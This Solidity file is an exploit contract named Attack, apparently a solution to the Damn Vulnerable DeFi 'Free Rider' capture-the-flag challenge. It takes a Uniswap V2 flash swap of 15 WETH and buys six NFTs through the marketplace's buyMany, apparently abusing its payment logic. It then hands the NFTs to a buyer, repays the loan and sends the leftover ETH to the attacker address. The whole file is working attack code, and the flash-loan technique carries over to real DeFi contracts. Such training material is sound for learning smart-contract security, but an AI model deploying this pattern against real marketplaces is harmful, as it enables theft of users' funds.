// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./Interfaces.sol";
import "../DamnValuableNFT.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";

/**
 * @title Attack
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract Attack {
    IUniswapV2Pair private immutable pair;
    INFTMarketplace private immutable marketplace;
    address private immutable buyer;
    address private immutable attacker;
    WETH9 private immutable weth;

    constructor(address _pair, address _marketplace, address _buyer, address _attacker, address _weth) {
        pair = IUniswapV2Pair(_pair);
        marketplace = INFTMarketplace(_marketplace);
        buyer = _buyer;
        attacker = _attacker;
        weth = WETH9(payable(_weth));
    }

    function attack() external {
        bytes memory data = new bytes(0);
        pair.swap(0, 15 ether, address(this), data);
        attacker.call{value: address(this).balance}("");
    }

    function uniswapV2Call() external {
        weth.withdraw(15 ether);
        uint256[] memory nftIds = new uint256[](6);
        for (uint8 i = 0; i < 6;) {
            nftIds[i] = i;
            unchecked {
                ++i;
            }
        }

        marketplace.buyMany{value: 15 ether}(nftIds);
        for (uint8 i = 0; i < 6;) {
            marketplace.token().safeTransferFrom(address(this), buyer, i);
            unchecked {
                ++i;
            }
        }

        weth.deposit{value: 15 ether * 1004 / 1000}();
        weth.transfer(address(pair), weth.balanceOf(address(this)));
    }
}

interface INFTMarketplace {
    function token() external returns (DamnValuableNFT);
    function buyMany(uint256[] calldata tokenIds) external payable;
}
